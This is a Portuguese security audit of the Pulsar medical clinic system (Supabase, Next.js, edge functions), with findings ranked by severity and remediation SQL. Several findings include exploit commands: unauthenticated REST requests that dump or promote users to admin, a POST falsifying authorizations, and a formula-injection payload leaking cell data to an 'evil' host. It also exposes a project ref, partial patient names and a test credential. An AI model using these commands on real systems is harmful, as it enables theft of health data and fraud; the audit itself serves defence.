# 🔒 Auditoria de Segurança — Sistema Pulsar
**Data:** 06 de julho de 2026 · **Escopo:** frontend (Next.js 16), APIs, Edge Functions (Deno), banco (Supabase/PostgreSQL), migrations, RLS, auth, config, dependências, infra, integrações (TiTa, ASSIM, WhatsApp/Central), upload/geração de arquivos.
**Método:** reconhecimento + 6 auditorias paralelas especializadas (pentester), lendo os arquivos reais. Não é análise superficial.

---

## ⚠️ AVISO DE PRECISÃO — verificar contra produção
Vários achados críticos de banco derivam do **histórico de migrations** e do `config.toml` (que é a config **local de dev**). Alterações manuais no Dashboard da Supabase podem divergir do que está no repositório. **Antes de concluir que um item está ou não explorável, rode as queries da seção "Verificação Imediata".** O pressuposto responsável é: *as migrations refletem produção até prova em contrário* — e como a **anon key é pública**, os itens marcados como "não autenticado" são **provavelmente exploráveis agora**.

---

## 1. RESUMO EXECUTIVO

O sistema **manipula dados médicos (PHI)** e hoje apresenta **múltiplos caminhos independentes de comprometimento total por um atacante NÃO autenticado**, além de **credenciais de produção vivas commitadas no Git**. O ponto mais grave não é um bug isolado, e sim uma **cadeia**:

> A **anon key é pública** (vai no bundle do navegador e ainda está commitada no repo) → a tabela **`usuarios` está com RLS desabilitado** e concede CRUD ao papel `anon` → qualquer pessoa na internet, só com a anon key, **lê todos os usuários/e-mails/papéis e se promove a `admin`** (ou apaga usuários). A partir daí, controla todo o modelo de autorização (que depende de `usuarios.role`/`central_role`).

Some-se a isso: **funções Edge de teste/sync sem autenticação usando a service_role** (backdoor de dados clínicos), **políticas RLS `USING(true)`** que sobreviveram a uma tentativa anterior de "hardening" (deixando autorizações médicas abertas a qualquer autenticado), **views/RPCs expostas ao `anon`** que furam o RLS, e a **service_role JWT (chave-mestra, válida até 2036) hardcoded em 34 arquivos + histórico Git**.

Pontos positivos reais (não regredir): o `proxy.ts` do Next 16 faz autorização **server-side** por rota; as rotas admin (`/api/admin/*`) autenticam e checam `isAdmin`; o schema `central` tem RLS multi-tenant **bem desenhado**; o token da TiTa é tratado corretamente (env, não logado, URLs fixas, sem SSRF); a UI de chat escapa conteúdo (sem XSS); CORS `*` foi corrigido; rate-limit de login e política de senha foram adicionados desde a auditoria anterior.

**Veredito de produção: 🔴 NO-GO** até corrigir os itens Críticos. **Ação de hoje: rotacionar chaves (Supabase JWT + senha ASSIM) e reabilitar RLS em `usuarios`.**

### Contagem
| Severidade | Qtde |
|---|---|
| 🔴 Crítico | 7 |
| 🟠 Alto | 11 |
| 🟡 Médio | 14 |
| 🔵 Baixo | 7 |
| ⏳ Latente (recursos ainda não construídos) | 3 |

### Score geral de segurança: **25 / 100**
Justificativa: existem **múltiplos vetores independentes de comprometimento total sem autenticação** (−) e **segredos de produção vivos no Git** (−); mitigado parcialmente por boa base de autorização server-side (`proxy.ts`), RLS correto no `central`, e integração TiTa segura (+). Enquanto os Críticos não forem corrigidos e **as chaves não forem rotacionadas**, o score permanece na faixa 20–30.

---

## 2. VERIFICAÇÃO IMEDIATA (rodar em produção antes de tudo)

No **SQL Editor** do projeto de produção:
```sql
-- (A) RLS está ligado nas tabelas sensíveis?  relrowsecurity deve ser true
SELECT relname, relrowsecurity
FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
WHERE n.nspname='public'
  AND relname IN ('usuarios','autorizacoes','chamada_paciente','sync_controle',
                  'agenda_tita','grade_profissionais_tita','csv_grades_profissionais');

-- (B) O que o papel anon pode fazer? (esperado: pouca ou nenhuma linha)
SELECT grantee, table_name, string_agg(privilege_type, ',') AS privs
FROM information_schema.role_table_grants
WHERE grantee='anon' AND table_schema='public'
GROUP BY grantee, table_name ORDER BY table_name;

-- (C) Políticas efetivas (procure roles={anon} ou qual='true')
SELECT tablename, policyname, roles, cmd, qual, with_check
FROM pg_policies WHERE schemaname='public' ORDER BY tablename, cmd;

-- (D) Views SEM security_invoker (reloptions nulo ou sem 'security_invoker=on')
SELECT c.relname, c.reloptions
FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
WHERE c.relkind='v' AND n.nspname='public';

-- (E) Funções SECURITY DEFINER e quem pode executar
SELECT p.proname, p.prosecdef,
       has_function_privilege('anon', p.oid, 'EXECUTE') AS anon_exec
FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace
WHERE n.nspname='public' AND p.prosecdef ORDER BY p.proname;
```
No **Dashboard**:
- **Auth → Providers/Settings:** `Enable Signup` está ligado? `Confirm email` está desligado? (o `config.toml` sugere signup aberto **sem** confirmação — perigoso).
- **Edge Functions:** cada função tem `verify_jwt` ligado? (mesmo ligado, a anon key pública passa — não é autenticação real).
- **Storage:** existe algum bucket `public`? As policies de `storage.objects` escopam por pasta/organização? (não há código de storage no repo — verificar só no Dashboard).
- **Database → Roles / API keys:** confirmar se a service_role/JWT ainda é a legada (a que vazou).

---

## 3. CRÍTICOS

### C1 — Service_role JWT (chave-mestra) + anon key + senha ASSIM commitados no Git
**Local:**
- **service_role JWT** hardcoded em **34 arquivos rastreados** e em **todo o histórico Git**. Amostra: `supabase/migrations/20260525000001_fn_sync_tita_semana.sql:18`, `20260612000001_restructure_sync_crons.sql:27,59,88`, `20260701135826_remote_schema.sql:602,637,664,687`, `backup_pre_rls_hardening.sql:494,527,554,578`, e scripts na raiz (`check_logs.py`, `run-fase2b-tests.js`, `invoke_test_engine.py`, `debug_schema.py`, etc.) e `tests/*`. Decodificada: `{"role":"service_role","ref":"wmugemamnqxjfpxrlwes","exp":~2036}`.
- **Agravante:** as migrations de cron gravam esse `Bearer eyJ...` em **texto claro na tabela `cron.job`** do banco de produção.
- **senha ASSIM** (`ASSIM_SENHA`) + URL/unidade em `robo-autorizador/.env`, commitada em `ac7cc39` e "removida" em `c7f3636` — **recuperável** via `git show ac7cc39:robo-autorizador/.env`.
- **anon key** commitada em `robo-autorizador/supabase/login.js:5` (anon é pública por design — risco menor, mas some junto na rotação).

**Por que é risco:** a service_role **ignora todo o RLS** — é acesso total (leitura/escrita/exclusão) a todos os dados médicos, Storage e Auth admin. A senha ASSIM é credencial de **portal externo de convênio** (fraude de autorização).

**Exploit:**
```bash
curl "https://wmugemamnqxjfpxrlwes.supabase.co/rest/v1/usuarios?select=*" \
  -H "apikey: <service_role_jwt>" -H "Authorization: Bearer <service_role_jwt>"   # dump total
# login no portal ASSIM como a clínica usando ASSIM_SENHA → autorizações fraudulentas
```
**Impacto:** comprometimento total do banco médico + conta externa. LGPD Art. 46/48.

**Correção (HOJE, nesta ordem):**
1. **Rotacionar a chave no Dashboard Supabase** (Settings → API → roll/JWT secret; ou migrar para o novo sistema de API keys e revogar a legada). Isso invalida a chave nos 34 locais de uma vez. **Rotacionar o JWT secret também troca a anon key** → atualizar `NEXT_PUBLIC_SUPABASE_ANON_KEY` no deploy (Coolify).
2. **Trocar a senha ASSIM** no portal.
3. Reescrever os cron jobs para ler a chave do **Vault**, não de literal, e recriar os jobs para **expurgar a chave da tabela `cron.job`**:
```sql
select vault.create_secret('<NOVA_service_role>', 'edge_service_key');
-- na função de cron, em vez de hardcode:
perform net.http_post(
  url := 'https://<ref>.supabase.co/functions/v1/sync-grade-csv',
  headers := jsonb_build_object(
    'Authorization','Bearer '||(select decrypted_secret from vault.decrypted_secrets where name='edge_service_key'),
    'Content-Type','application/json'));
```
4. Remover a chave de todos os scripts/tests (usar `os.environ`/`process.env`).
5. Limpar o histórico Git (`git filter-repo` ou BFG) e forçar push — a chave fica recuperável no histórico mesmo após editar os arquivos.

---

### C2 — Tabela `usuarios` com RLS DESABILITADO + grants completos a `anon`
**Local:** `supabase/migrations/20260610000015_fix_usuarios_rls.sql:7` → `ALTER TABLE public.usuarios DISABLE ROW LEVEL SECURITY;`. Grants a `anon` (select/insert/update/delete) em `20260518131652_remote_schema.sql:3151-3163`. O dump recente `20260701135826` **não** re-habilita nem revoga.

**Por que é risco:** `usuarios` tem `id, nome, email, role, central_role, organization_id, ativo` (PII + campo de autorização) e está no schema `public` (exposto via PostgREST). Com RLS OFF, só os GRANTs governam — e `anon` tem CRUD.

**Exploit (não autenticado, só com a anon key pública):**
```
GET   /rest/v1/usuarios?select=*                              # dump de todos usuários/e-mails/papéis
PATCH /rest/v1/usuarios?id=eq.<meu_uid>  {"role":"admin","ativo":true}   # auto-promoção a admin
DELETE /rest/v1/usuarios?id=eq.<qualquer>                     # apagar usuários
```
**Impacto:** vazamento do diretório de usuários + **controle total do modelo de autorização** (todo `is_admin()`, RLS do `central` e o `proxy.ts` confiam em `usuarios.role`). Comprometimento total.

**Correção:**
```sql
ALTER TABLE public.usuarios ENABLE ROW LEVEL SECURITY;
REVOKE ALL ON public.usuarios FROM anon;
REVOKE INSERT, UPDATE, DELETE ON public.usuarios FROM authenticated;  -- deixar só SELECT
CREATE POLICY usuarios_admin_all ON public.usuarios FOR ALL TO authenticated
  USING (public.is_admin()) WITH CHECK (public.is_admin());
CREATE POLICY usuarios_view_own ON public.usuarios FOR SELECT TO authenticated
  USING (id = auth.uid());
```

---

### C3 — Escalonamento de privilégio: usuário altera a própria `role`/`central_role`/`organization_id`
**Local:** consequência de C2. A policy protetora `usuarios_update_own_profile` (que impedia trocar `role`, em `20260610000011_rls_hardening_rbac_unit_isolation.sql:458-463`) foi **deliberadamente removida** por `20260610000015:12`.

**Exploit:** autenticado comum faz `PATCH /rest/v1/usuarios?id=eq.<meu_uid>` com `{"role":"admin","central_role":"admin","organization_id":"<uuid_outra_org>"}`. No próximo refresh, o `custom_access_token_hook` injeta essas claims. **Anula o isolamento multi-tenant do `central`** (C3 ⇒ ler comunicações de pacientes de outras organizações).

**Correção:** resolvida por C2 (garantir que `role`/`central_role`/`organization_id`/`ativo` nunca sejam graváveis pelo próprio usuário).

---

### C4 — `handle_new_user()` define `role` a partir de metadata do usuário + signup público sem confirmação
**Local:** `20260701135826_remote_schema.sql:1100-1111` → `role = coalesce(new.raw_user_meta_data->>'role','recepcao')`. `config.toml:171,216` `enable_signup=true`; `:221` `enable_confirmations=false`.

**Exploit:** `supabase.auth.signUp({ email, password, options:{ data:{ role:'admin' }}})` cria linha `role=admin` (ativo=false). Combinado com C2 (`PATCH ativo=true`) ⇒ **admin ativo auto-registrado a partir da internet**, sem confirmar e-mail.

**Correção:**
```sql
-- na função handle_new_user, nunca confiar na metadata:
role := 'recepcao';   -- valor seguro fixo (ou allow-list)
```
E no Dashboard: desabilitar signup público (criar usuários só via `admin-create-user`) e exigir confirmação de e-mail.

---

### C5 — Edge function `cco-test-setup`: backdoor não autenticado com service_role sobre dados clínicos
**Local:** `supabase/functions/cco-test-setup/index.ts` (todo o arquivo; `createClient(URL, SERVICE_ROLE_KEY)` na linha 12). Sem autenticação, sem CORS, sem validação. Router genérico: `insert_atendimento`, `insert_authorization`, `update_atendimento`, `update_authorization` (aplica `updates` arbitrário por `session_key`), `cleanup` (delete).

**Exploit:**
```bash
curl -X POST https://<ref>.supabase.co/functions/v1/cco-test-setup \
 -H "Content-Type: application/json" \
 -d '{"action":"update_authorization","data":{"session_key":"<hash>","source":"assim","updates":{"authorization_status":"LIBERADA"}}}'
# (se verify_jwt estiver ligado, adicionar a anon key pública nos headers — está no bundle)
```
**Impacto:** falsificação/exclusão de autorizações e atendimentos médicos; fraude de faturamento; perda de integridade da conciliação CCO.

**Correção:** **remover a função do deploy de produção e do repo.** Fixtures de teste nunca devem ser um endpoint HTTP publicado.

---

### C6 — Edge functions de sync/CSV sem autenticação interna, com service_role → dump de PII e resync destrutivo
**Local (todas usam service_role e não checam usuário/papel no handler):**
- `get-grade-csv/index.ts:51-97` — retorna o grade inteiro da TiTa (nome de paciente, **CPF do profissional**, terapia, sala, convênio) para qualquer intervalo de datas.
- `sync-grade-csv/index.ts:162-175` e `sync_tita_grade/index.ts:94-98` — `DELETE ... gte(data_inicio).lte(data_fim)` seguido de reinsert, governado só pelas datas do body → **delete em massa** + martelar a TiTa (DoS).
- `sync_tita_agenda/index.ts:501+` — insere/inativa sessões da agenda; processa CPF, data de nascimento, responsável, carteirinha; **loga nomes de pacientes** (`:295,493`).

**Exploit:** `curl -X POST .../functions/v1/get-grade-csv -d '{"data_inicio":"2026-07-01","data_fim":"2026-07-31"}'` → dump de PII. `sync_tita_grade` com range `2000-01-01..2100-01-01` → apaga tudo.
**Impacto:** exfiltração de PII (LGPD) e perda/DoS de dados operacionais.

**Correção:** exigir JWT + papel no topo de cada handler (ver helper em §8) **ou** um `X-CRON-SECRET` para jobs agendados; declarar `[functions.<nome>] verify_jwt=true` no `config.toml` (defesa, não autenticação); limitar o range de datas; remover PII dos logs.

---

### C7 — Políticas `USING(true)` sobreviveram ao "hardening" em `autorizacoes`, `chamada_paciente`, `sync_controle`
**Local:** `20260610000009_fix_rls_public_policies.sql` criou políticas **novas** em inglês (`"select autorizacoes authenticated" USING(true)` `:21`, `"all chamada_paciente authenticated" FOR ALL USING/CHECK(true)` `:45-51`, `"select/update sync_controle authenticated"` `:75-89`). Depois `20260610000011:12-38` só deu `DROP POLICY` nos **nomes antigos em português** (que já não existiam). As `USING(true)` **nunca foram dropadas**.

**Por que é risco:** políticas são OR — a `USING(true)` sempre vence a política baseada em papel. O RBAC pretendido nessas tabelas é inócuo.

**Exploit:** qualquer autenticado (inclusive conta recém-criada, sem permissão nenhuma no app): `GET /rest/v1/autorizacoes?select=*` lê/insere/atualiza todas as autorizações médicas; idem `chamada_paciente` e `sync_controle`.
**Impacto:** IDOR no nível do banco; leitura/escrita irrestrita de dados clínicos por qualquer conta.

**Correção:**
```sql
DROP POLICY IF EXISTS "select autorizacoes authenticated"  ON public.autorizacoes;
DROP POLICY IF EXISTS "insert autorizacoes authenticated"  ON public.autorizacoes;
DROP POLICY IF EXISTS "update autorizacoes authenticated"  ON public.autorizacoes;
DROP POLICY IF EXISTS "all chamada_paciente authenticated" ON public.chamada_paciente;
DROP POLICY IF EXISTS "select sync_controle authenticated" ON public.sync_controle;
DROP POLICY IF EXISTS "update sync_controle authenticated" ON public.sync_controle;
-- as políticas por papel de ...011 já cobrem o acesso legítimo.
```

---

## 4. ALTOS

### A1 — Views concedidas a `anon` sem `security_invoker` (bypass de RLS)
**Local:** nenhuma view do projeto define `security_invoker=true` (0 ocorrências). Concedidas a `anon`: `public.occurrences` (`20260610000005:6,30`), `vw_terapeutas_semana` (`20260605190001:48`), `vw_modal_substituicao_terapeutas` (`20260603120000:68`). View sem invoker roda como o dono (postgres) e **ignora o RLS** das tabelas-base.
**Exploit:** `GET /rest/v1/occurrences?select=*` / `vw_terapeutas_semana` com a anon key → nomes de terapeutas, agenda semanal, substituições, ocorrências. `public.occurrences` **fura** o RLS restrito de `cco.occurrences`.
**Correção:** `ALTER VIEW ... SET (security_invoker = true);` e `REVOKE SELECT ... FROM anon;` (aplicar também a `vw_central_pacientes`, `vw_central_autorizacoes`, `vw_kpis_auditoria_assim`).

### A2 — RPC `get_dashboard_kpis()` `SECURITY DEFINER` concedida a `anon`
**Local:** `20260611200005_fix_rpc_ambiguous_columns.sql:12,89`. Roda como owner (bypass RLS), sem checar chamador.
**Exploit:** `POST /rest/v1/rpc/get_dashboard_kpis` com anon key → métricas operacionais por unidade.
**Correção:** `REVOKE EXECUTE ... FROM anon;` + checagem de papel no corpo, ou tornar `SECURITY INVOKER`.

### A3 — Leitura irrestrita de PII por QUALQUER autenticado (RPCs + tabelas `USING(true)`)
**Local:** `get_cco_atendimentos` (`20260622000002:25` DEFINER, grant a `authenticated`, retorna `paciente_nome`, terapia, profissional, **sem checar papel**), `listar_central_pacientes` (`20260614000000`), `get_auditoria_assim`/`get_faltas_auditoria_assim`; tabelas-base `agenda_tita` (`20260525000000:9-14`), `agenda_terapias`/`agenda_orbita`, `grade_profissionais_tita` (`20260524120000:13`) com `USING(true)` p/ authenticated.
**Por que importa:** é isto que torna real o "abrir o DevTools e chamar `supabase.rpc(...)`" — o `proxy.ts` bloqueia a **navegação** de página, mas **não** as queries diretas do cliente ao Supabase. Um `terapeuta` (ou conta nova) lê o cadastro clínico inteiro.
**Correção:** trocar `USING(true)` por escopo de papel/unidade (como em `controle_terapeutico`); checar papel dentro de `get_cco_atendimentos`; `REVOKE ... FROM anon` por defesa em profundidade.

### A4 — `/api/guias-digitais/processar` (rota Next órfã, mas publicada) vaza carimbos digitais de terapeutas
**Local:** `frontend/app/api/guias-digitais/processar/route.ts:25-31` (só checa "logado"), `:74-91,102,114-124` (usa `supabaseService` = service_role, RLS ignorado; retorna `terapeutas[].carimbo_digital`). O número da guia vem do PDF que o próprio usuário envia. A UI real usa a edge function `processar-guias` (que autentica e checa papel corretamente) — a rota Next parece **órfã**, porém continua **acessível diretamente**.
**Exploit:** qualquer autenticado (ex.: `recepcao`) faz POST multipart com PDF cujo texto tem números de guia → resposta traz `carimbo_digital` (assinatura para falsificar guias).
**Correção:** **remover a rota Next órfã**, ou trocar `supabaseService` pelo client com JWT do usuário + checagem de papel (alinhar à edge function). Nunca retornar `carimbo_digital` cru.

### A5 — Edge `fila-validacao` + rota `fila-autorizacoes/validacao`: IDOR na fila de autorização
**Local:** `supabase/functions/fila-validacao/index.ts:50-66` (getUser, **sem** checar papel/ativo, `supabaseAdmin.update().eq("id", id)`); `frontend/app/api/fila-autorizacoes/validacao/route.ts:10-29` (só getUser, sem papel, `id` não validado, `error.message` cru no catch `:42`).
**Exploit:** qualquer autenticado marca qualquer item da fila como validado: `POST {"id":"<qualquer>","forma_autorizacao":"x"}`.
**Correção:** checar papel (`admin|autorizacao|diretoria|recepcao`) + validar `id` (UUID) e `forma_autorizacao` (allow-list); não vazar `error.message`.

### A6 — Edge `controle-terapeutico-upsert`: checagem de papel só no proxy Next, não na função
**Local:** `supabase/functions/controle-terapeutico-upsert/index.ts:105,194` (getUser, sem papel/ativo, upsert com service_role). A rota Next `controle-terapeutico/upsert/route.ts:36-43` checa papel, mas a função é **chamável direto** em `/functions/v1/controle-terapeutico-upsert`.
**Exploit:** qualquer autenticado grava atendimento/substituição de qualquer agendamento chamando a função diretamente.
**Correção:** aplicar a mesma checagem de papel+ativo **dentro** da função (não depender do proxy).

### A7 — `auth-lookup-username` + login: enumeração de usuários e vazamento de e-mail
**Local:** `supabase/functions/auth-lookup-username/index.ts:37-59` (retorna `{email}` via service_role); `frontend/app/login/page.tsx:23-35` (consulta `usuarios` por username com anon e mostra "Usuário não encontrado").
**Exploit:** `POST /functions/v1/auth-lookup-username -d '{"username":"caio"}'` → e-mail; 200 vs 404 confirma existência. Base para phishing/credential stuffing.
**Correção:** resolver username→login **server-side** num único endpoint que faz o `signInWithPassword` internamente e **não devolve o e-mail**; mensagem de falha genérica; rate limit/captcha; garantir que `anon` não faça SELECT em `usuarios` (resolvido por C2).

### A8 — `tita-compare-endpoints`: endpoint de debug não autenticado com PII + nomes reais de pacientes no código
**Local:** `supabase/functions/tita-compare-endpoints/index.ts:24` (`PACIENTES_ALVO=["isabella","anny karoline","phettrus","heitor lemos"]` — **nomes reais commitados**), `:51,61-62,146-171` (proxy TiTa sem auth, retorna PII).
**Correção:** **apagar a função** do deploy e do repo; remover os nomes do histórico Git.

### A9 — `xlsx@0.18.5` (SheetJS) com CVEs sem fix no npm, parseando uploads do usuário
**Local:** `frontend/package.json:35`; parse em `frontend/lib/cronograma/xlsx.ts:14`, `components/cronograma/solicitacoes/DadosUploadPanel.tsx:283`, `app/(dashboard)/cronograma/layout.tsx:18`. CVE-2023-30533 (prototype pollution, fix ≥0.19.3) e CVE-2024-22363 (ReDoS, ≥0.20.2) — a 0.18.5 do npm **não tem fix**.
**Exploit:** planilha maliciosa importada polui `Object.prototype` (corrompe lógica/XSS client) ou trava a aba (ReDoS).
**Correção:** migrar para o build oficial SheetJS ≥0.20.2 (CDN) ou `exceljs`; validar tamanho/tipo (A11/M) e, idealmente, parsear em Web Worker/servidor.

### A10 — Injeção de fórmula (CSV injection) nas exportações
**Local:** `frontend/components/cronograma/ocupacao/tabs/AcompanhamentoTab.tsx:473-477` e `components/cronograma/solicitacoes/BancoDadosTab.tsx:150-154` — montam CSV só com aspas duplicadas; não neutralizam `= + - @`/TAB/CR iniciais. Campos incluem observação livre digitada.
**Exploit:** observação `=HYPERLINK("http://evil/?"&A1,"x")` executa ao abrir no Excel.
**Correção:**
```ts
const csvSafe = (v:unknown) => { let s=String(v??""); if(/^[=+\-@\t\r]/.test(s)) s="'"+s; return `"${s.replace(/"/g,'""')}"` }
```

### A11 — `/tv`: rota pública transmitindo PHI de pacientes
**Local:** `frontend/app/tv/page.tsx` (fora do `(dashboard)`; `/tv` está na lista de rotas públicas do `proxy.ts:46`). Assina realtime de `chamada_paciente` e `fila_autorizacoes` com a anon key e exibe/fala nome do paciente + sala.
**Exploit:** abrir `https://<host>/tv` **sem login** → nomes/salas de pacientes conforme são chamados (depende da publicação realtime + RLS estarem abertos a `anon`).
**Correção:** exigir auth ou um **token de dispositivo** dedicado (identidade de baixo escopo para o painel da recepção), limitar a colunas mínimas (só primeiro nome), e garantir que `chamada_paciente` não esteja exposta a `anon` no realtime/RLS.

---

## 5. MÉDIOS

- **M1 — Isolamento multi-tenant do `central` depende de fonte gravável (`usuarios`).** RLS bem desenhado (`20260701000800`), mas claim/fallback vêm de `usuarios` (C2/C3) → resolvido ao corrigir C2/C3.
- **M2 — `/api/central/messages*` sem checagem de org na aplicação.** `messages/route.ts:17,25`, `messages/[id]/route.ts:18`; repositórios filtram só por `conversation_id`. Isolamento depende 100% do RLS + do Auth Hook habilitado no Dashboard. **Fix:** exigir `conversation.organization_id === user.orgId` e filtrar por `organization_id` no repositório (defesa em profundidade) + teste cross-org.
- **M3 — Tabelas de PII compartilhadas com `USING(true)`:** `substituicoes_historico`, `saida_aceites`, `acomp_*`, `csv_grades_profissionais` (expõe `profissional_cpf`). **Fix:** escopo por papel/unidade.
- **M4 — Processamento de PDF sem limite de tamanho/páginas (DoS):** `processar-guias/index.ts:305-311` e a rota Next. **Fix:** teto de `file.size` (~15MB) e `pageCount`; validar assinatura mágica `%PDF-`.
- **M5 — Upload de planilha sem validação de tamanho/tipo real:** `DadosUploadPanel.tsx:42-68` (`accept=".xlsx"` é só UI). **Fix:** validar `size`/MIME antes do parse.
- **M6 — Credencial de quiosque compartilhada** (`disponibilidade@universoaba.com.br` + senha única) em `app/disponibilidade-terapeuta/login/page.tsx:9,56-59`; uma conta lê/escreve disponibilidade de toda a clínica, sem rastreabilidade. **Fix:** contas por terapeuta ou tokens de dispositivo curtos; rotacionar o segredo (tratar como comprometido).
- **M7 — `auth-complete-setup` permite auto-reativação:** `index.ts:80` seta `ativo:true` sem checar estado de primeiro acesso → usuário desativado pelo admin se reativa. **Fix:** exigir `primeiro_acesso=true` e não deixar setar `ativo`.
- **M8 — Conta fraca `teste@teste.com` / `123456`** em `robo-autorizador/supabase/login.js`. **Fix:** confirmar que não existe em produção (ou deletar) e remover o arquivo.
- **M9 — `create-user*` aceita `role` sem allow-list** (`create-user/route.ts`, `create-user-with-password/route.ts`, e edge `admin-change-role`). É admin-gated, mas inconsistente. **Fix:** validar contra `ROLES_VALIDAS`. `create-user-with-password` também não checa força de senha.
- **M10 — CSP anula proteção XSS:** `next.config.ts` usa `script-src 'self' 'unsafe-inline' 'unsafe-eval'`. **Fix:** remover `unsafe-eval`; trocar `unsafe-inline` por nonce/hash.
- **M11 — Rate limiting ausente/ineficaz:** só `admin/user/change-role` usa `checkRateLimit`; `create-user`, `resend-invite`, `central/search`, `guias/processar` não têm. `lib/rate-limit.ts` é **in-memory** (por instância) → inútil em multi-instância. **Fix:** store compartilhado (Redis/Upstash) + limites nesses endpoints; cap de tamanho de corpo.
- **M12 — Vazamento de erro/stack ao cliente:** `error.message`/`stack` em `fila-autorizacoes/validacao:42`, `automation/*`, `admin/*`, `sync_tita_agenda:541`, `sync-grade-csv`. **Fix:** mensagem genérica + log server-side (padrão que o `central/*` já usa via `mapCentralError`).
- **M13 — Callback de auth loga `code`/`token_hash`/URL no console:** `app/auth/callback/page.tsx:21-30`. (Positivo: o `next` **é** validado contra open redirect, `:18`.) **Fix:** remover os `console.log`.
- **M14 — Build não reprodutível / container root:** `package-lock.json` não commitado; `Dockerfile` usa `npm install --frozen-lockfile` (flag inexistente no npm) → resolve `^` para a última versão a cada build (supply-chain). Runner roda como root. **Fix:** commitar lockfile + `npm ci`; adicionar `USER node`.

---

## 6. BAIXOS

- **B1 — `logs`: insert aberto** (`WITH CHECK(true)`) a qualquer autenticado (`20260610000009:59`). Restringir a service_role/roles específicas.
- **B2 — `config_regras_terapias` concedida a `anon`** (`20260611000006:17`) — desnecessário. `REVOKE`.
- **B3 — `.gitignore` inconsistente:** `robo-autorizador/` listado, mas 19 arquivos rastreados (foi assim que o `.env` vazou); `supabase/.temp/*` expõem `project-ref`, org e `pooler-url` (host/usuário/porta do DB, sem senha). `git rm -r --cached robo-autorizador/`.
- **B4 — Controles do worker/automação visíveis a todo papel** no `Sidebar.tsx:562-602` (chamam edge functions com JWT do usuário). Esconder p/ não-admin **e** garantir enforcement nas functions.
- **B5 — Deps supérfluas/obsoletas:** `file-saver` (não usado), `install` e `npm` como devDependencies (typosquatting), `pdf-lib` defasado. Remover/atualizar.
- **B6 — Interpolação sem encode na URL da TiTa** (`sync_tita_agenda:306`, `tita-compare-endpoints:62`) — host fixo (não é SSRF), mas usar `URL`/`searchParams`.
- **B7 — Sem timeout de sessão** (`config.toml:266-271` comentado) e sem log de acesso a PHI/retenção formal (parcial: `audit_logs` existe). Avaliar `[auth.sessions] timebox/inactivity_timeout` e política de retenção LGPD.

---

## 7. LATENTES (ainda não construídos — projetar seguro desde já)

- **L1 — Webhook WhatsApp de entrada:** ainda não existe rota, mas `message.service.ts:54-71,204-219` confia em `orgId` do payload e escreve com service-role. Ao criar: verificar **HMAC sobre o corpo cru** (Meta `X-Hub-Signature-256`), **derivar a org do canal no banco** (nunca do payload), idempotência + rate limit.
- **L2 — Worker de download de mídia (SSRF):** `20260701000600:86-95` documenta um worker que fará GET em `external_url`. Ao construir: allowlist de `https` + hosts de mídia; bloquear IPs privados/link-local; sem seguir redirects internos; timeout/tamanho máximo.
- **L3 — Supabase Storage:** não há buckets/código no repo. Verificar no Dashboard se algum bucket é `public` e se as policies de `storage.objects` escopam por pasta/organização — **antes** de ligar L2 ou uploads de "laudos".

---

## 8. Helper recomendado para as Edge Functions (fecha C5, C6, A5, A6)
```ts
// supabase/functions/_shared/auth.ts
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
const URL = Deno.env.get("SUPABASE_URL")!, SR = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const admin = createClient(URL, SR, { auth: { persistSession: false } });

export async function requireUser(req: Request, roles?: string[]) {
  const m = (req.headers.get("authorization") || "").match(/^Bearer\s+(.+)$/i);
  if (!m) return { error: "not_authenticated", status: 401 as const };
  const scoped = createClient(URL, SR, {
    global: { headers: { Authorization: `Bearer ${m[1]}` } }, auth: { persistSession: false } });
  const { data: { user } } = await scoped.auth.getUser();
  if (!user) return { error: "not_authenticated", status: 401 as const };
  const { data: p } = await admin.from("usuarios").select("role, ativo").eq("id", user.id).single();
  if (!p?.ativo) return { error: "forbidden", status: 403 as const };
  if (roles && !roles.includes(p.role)) return { error: "forbidden", status: 403 as const };
  return { user, perfil: p, scoped };
}
// Para jobs de cron, comparar um segredo em vez de um usuário:
export const requireCronSecret = (req: Request) =>
  !!Deno.env.get("CRON_SECRET") && req.headers.get("x-cron-secret") === Deno.env.get("CRON_SECRET");
```

---

## 9. CHECKLIST OWASP (API/Web Top 10)
| Categoria | Status | Evidência |
|---|---|---|
| A01 Broken Access Control | 🔴 Falha | C2, C3, C7, A3, A4, A5, A6, A11 (IDOR no banco; RPCs/tabelas abertas; funções sem RBAC) |
| A02 Cryptographic Failures | 🔴 Falha | C1 (service_role + senha ASSIM no Git); HSTS/TLS ok |
| A03 Injection | 🟡 Parcial | Sem SQLi (query builder/`quote_literal`); **CSV injection (A10)**; sem SSRF real (TiTa host fixo) |
| A04 Insecure Design | 🟠 | Autorização de dados depende só de RLS; sem defesa em profundidade nas rotas de dados |
| A05 Security Misconfiguration | 🟠 | CSP fraca (M10), signup aberto sem confirmação (C4), debug endpoints em prod (C5,A8), container root (M14) |
| A06 Vulnerable Components | 🟠 | `xlsx@0.18.5` (A9); build sem lockfile (M14); deps supérfluas |
| A07 Auth Failures | 🟠 | Enumeração de usuário (A7); rate limit ineficaz (M11); conta fraca (M8); sem timeout de sessão (B7) |
| A08 Integrity Failures | 🟠 | `handle_new_user` confia em metadata (C4); build não reprodutível (M14) |
| A09 Logging/Monitoring | 🟡 | `audit_logs` existe; mas PII/segredos em logs (C6, M13); `logs` insert aberto (B1) |
| A10 SSRF | 🟢/⏳ | Sem SSRF hoje (hosts fixos); **latente** no worker de mídia (L2) |
| API1 BOLA/IDOR | 🔴 | A4, A5, C7, A3 |
| API2 Broken Auth | 🔴 | C2, C5, C6 (endpoints sem auth) |
| API3 Property Auth | 🟠 | mass-assignment de `role` (C4, M9) |

## 10. CHECKLIST LGPD (dados de saúde = dados sensíveis, Art. 11)
| Item | Status | Nota |
|---|---|---|
| Confidencialidade (Art. 6 VII, 46) | 🔴 | Exposição de PHI a não autenticados (C2, C6, A1, A11) e a qualquer autenticado (C7, A3) |
| Segurança de credenciais (Art. 46/48) | 🔴 | Segredos de produção no Git (C1) — incidente reportável |
| Nomes de pacientes no código-fonte | 🔴 | A8 (`PACIENTES_ALVO`) |
| Minimização de dados (Art. 6 III) | 🟠 | RPCs/rotas retornam mais PII que o necessário (CPF, carimbo digital) |
| Registro de acesso a PHI | 🟡 | `audit_logs` parcial; sem trilha "quem viu qual paciente" |
| PII em logs | 🟠 | Nomes de pacientes logados (C6) |
